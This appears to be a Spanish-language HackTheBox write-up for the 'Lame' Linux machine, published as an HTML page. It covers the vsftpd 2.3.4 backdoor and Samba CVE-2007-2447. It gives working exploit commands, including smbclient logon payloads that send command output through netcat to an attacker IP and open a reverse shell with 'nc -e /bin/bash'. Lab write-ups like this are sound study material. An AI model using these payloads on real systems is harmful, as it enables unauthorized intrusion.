@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Lame HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/lame/pasted-20251030200257.png" alt="Lame HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Lame</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>linux</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Rabbit Hole</code>: FTP anónimo y servicios antiguos sin vía útil</li>
+            <li><code>Explotación</code>: Samba 3.0.20 vulnerable a ejecución remota mediante <code>username map script</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/lame/pasted-20260127163051.png" alt="Lame HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Rabbit Hole: FTP (Vulnerable a RCE parcheado)</h2>
+          <p>- Sesión <code>anonymous</code> sin relevancia</p>
+          <p>- Versión ftp: <code>vsftpd 2.3.4</code> vulnerable al siguiente <code>exploit</code></p>
+          <img class="writeup-image" src="/writeups/assets/lame/pasted-20251103190318.png" alt="Lame HTB" />
+          <p>Si nos conectamos con netcat al puerto 21 vulnerable, podemos escribir el comando de la sonrisita <code>:)</code>, y se abre el puerto 6200 de la máquina víctima con una shell interactiva</p>
+          <div class="code-card">
+            <h3>PoC manual con ftp</h3>
+            <pre><code>ftp lame 
+ruyztz:)
+pass
+
+# Se deberá de abrir una shell en el puerto 6200 de la máquina víctima</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>PoC manual con netcat</h3>
+            <pre><code>nc lame 21
+USER ruyztz:)
+PASS pass
+
+# Se deberá de abrir una shell en el puerto 6200 de la máquina víctima</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: samba 3.0.20 (CVE-2007-2447)</h2>
+          <p>Esta vulnerabilidad permite lanzar comandos desde la función <code>SamrChangepassword</code> cuando <code>username map script</code> está habilitado en el archivo <code>smb.conf</code></p>
+          <img class="writeup-image" src="/writeups/assets/lame/pasted-20251103191255.png" alt="Lame HTB" />
+          <div class="code-card">
+            <h3>El exploit trata de conectarse al servicio samba como el usuario:</h3>
+            <pre><code># Usuario: "/=`nohup &lt;comando&gt;`"
+# nohup se usa para lanzar comandos cuando una consola se muere</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listar recursos compartidos</h3>
+            <pre><code>smbmap -H lame</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/lame/pasted-20260127162625.png" alt="Lame HTB" />
+          <div class="code-card">
+            <h3>Conectarnos al share y ejecutar comandos</h3>
+            <pre><code>smbclient //lame/tmp -N
+logon "/=`nohup ifconfig | nc 10.10.16.64 443`"
+logon "/=`nohup nc -e /bin/bash 10.10.16.64 443`"
+# Password: Lo que sea
+sudo nc -nlvp 443 # Desde kali</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/lame/pasted-20251103194003.png" alt="Lame HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>linux</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
